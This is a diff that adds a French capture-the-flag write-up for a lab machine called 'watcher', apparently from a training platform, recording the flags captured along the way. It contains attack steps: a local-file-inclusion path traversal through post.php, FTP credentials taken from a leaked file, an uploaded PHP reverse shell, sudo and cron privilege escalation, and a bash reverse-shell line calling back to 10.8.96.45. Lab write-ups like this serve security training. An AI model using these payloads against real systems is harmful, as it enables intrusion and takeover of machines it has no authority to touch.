@@ -1,0 +1,80 @@
+j'ai essaye de faire un nmap mais je ne trouvais rien alors j'ai acceder a la page en mettant l'adresse ip ensuite je suis alle sur /robots.txt voici le resultat
+
+User-agent: *
+Allow: /flag_1.txt
+Allow: /secret_file_do_not_read.txt
+
+
+j'ai acceder a flag1 et voila le flag1 : User-agent: FLAG{robots_dot_text_what_is_next}
+
+j'ai essaye d'acceder a l'aute page mais rien forbiden
+
+A pres utilisation de LFI sur http://10.10.199.88/post.php?post=secret_file_do_not_read.txt
+
+on accede a des informations: 
+
+Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 
+
+je vais essayer de me connecter en ftp voir
+
+voici le flag2: FLAG{ftp_you_and_me}
+
+APres ca j'ai upload un reverse shell ds le fichier files a partir du ftp avec la commande put
+
+Ensuite j'ai utiliser curl pour executer le fichier et avceder a un reverse shell 
+
+curl http://10.10.199.88/post.php?post=../../../../home/ftpuser/ftp/files/reverse.php
+
+Qusnd j'ai scceder j'ai trouve le flag dans un dossier nome secret... 
+
+voici le flag3: FLAG{lfi_what_a_guy}
+
+
+je vais essayer de chercher dans les autres fichers voir si je trouve quelque chose
+
+
+je trouve le fichier flag4 dans le dossier de toby mais je n'aii pas d'acces
+
+j'ai execute la commande sudo -l
+
+sudo -l
+Matching Defaults entries for www-data on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+
+
+after j'ai fait un sudo -u toby bash et j'ai acces a l'utilisateur toby
+
+ voila le flag4 : FLAG{chad_lifestyle}
+
+
+j'ai ajouter cette ligne au fichier cow.sh
+
+chmod 777 /home/mat/flag_5.txt
+puis j'ai acceder au fichier flag5 et j'ai compris que mat executait le fichier cow.sh en cron donc j'ai mis un reverse shell 
+
+sh -i >& /dev/tcp/10.8.96.45/1234 0>&1
+
+puis j'ai acceder a l'utilisateur mat 
+
+je recadre le shell avec : /usr/bin/python3.6 -c 'import pty; pty.spawn("/bin/bash")'
+
+ensuite avec : export TERM=xterm puis control z et stty raw -echo;fg
+
+
+
+voila le flag5: FLAG{live_by_the_cow_die_by_the_cow}
+
+faire un reverse avec un script python et obtenir le flag 6 
+
+flag_6.txt FLAG{but_i_thought_my_script_was_secure} 
+
+
+
+apres cela dns opt/backup il y a une cle pour le root
+
+FLAG{who_watches_the_watchers}
+
